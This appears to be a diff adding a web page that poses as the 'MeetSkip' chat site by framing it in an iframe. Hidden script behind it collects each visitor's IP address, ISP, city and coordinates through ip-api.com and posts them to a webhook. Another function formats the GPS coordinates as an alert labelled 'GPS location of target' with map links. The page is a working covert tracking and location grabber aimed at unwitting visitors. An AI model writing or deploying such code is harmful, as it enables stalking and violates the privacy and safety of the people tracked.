@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MeetSkip</title>
+
+<body>
+  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;"> </iframe>
+  <p id="demo"></p>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script>
+    var x = document.getElementById("demo");
+
+    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
+
+      const request = new XMLHttpRequest();
+      request.open("POST", "/location_update"); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        continent: response.continent,
+        continentCode: response.continentcode,
+        country: response.country,
+        countryCode: response.countrycode,
+        regionName: response.regionName,
+        region: response.region,
+        city: response.city,
+        district: response.district,
+        zip: response.zip,
+        timeZone: response.time_zone,
+        name: response.name,
+        as: response.as,
+        isp: response.isp,
+        reverse: response.reverse,
+        offset: response.offset,
+        currency: response.currency,
+        proxy: response.proxy,
+        mobile: response.mobile,
+        latitude: response.lat,
+        longitude: response.lon,
+        status: response.status,
+        ip: response.query
+      }
+
+      //var latitude = response.lat
+      //var longitude = response.lon
+      //showPosition(latitude, longitude)
+
+      request.send(JSON.stringify(params));
+    })
+
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, error);
+      } else {
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
+
+    const options = {
+      enableHighAccuracy: true,
+      timeout: 5000,
+      maximumAge: 0
+    };
+
+    function showPosition(latitude, longitude) {
+      var latlong = (" GET ", "```prolog\nLatitude:" + latitude + "\nLongitude:" + longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + latitude + "," + longitude + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + latitude + "," + longitude);
+
+      const request = new XMLHttpRequest();
+      request.open("POST", "/location_update"); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var myEmbed = {
+        author: {
+          name: "Target Allowed Location Permission"
+        },
+        title: "GPS location of target..",
+        description: latlong + "\n",
+        color: 15844367,
+        footer: {
+          text: "GPS fetch almost exact location because it uses longitude and latitude coordinates."
+        }
+      }
+
+      var params = {
+        embeds: [myEmbed]
+      }
+
+      request.send(JSON.stringify(params));
+
+    }
+
+    function error(err) {
+      console.warn(`ERROR(${err.code}): ${err.message}`);
+    }
+
+
+  </script>
+</body>
+
+</html>
